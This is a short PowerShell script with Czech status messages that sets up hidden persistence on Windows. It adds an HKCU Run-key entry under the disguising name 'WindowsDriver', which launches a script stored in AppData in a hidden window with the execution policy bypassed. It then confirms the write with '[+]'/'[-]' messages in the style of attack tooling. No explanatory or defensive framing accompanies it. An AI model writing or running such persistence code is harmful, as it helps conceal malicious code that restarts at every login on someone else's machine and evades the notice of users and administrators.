$scriptPath = "$env:APPDATA\SchedTas.ps1"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsDriver"

try {
    Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    $check = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
    if ($check.$regName) {
        Write-Host "[+] Skript přidán do HKCU\Run."
    } else {
        Write-Host "[-] Nepodařilo se ověřit zápis do registru."
    }
} catch {
    Write-Host "[-] Chyba při zápisu do registru: $_"
}
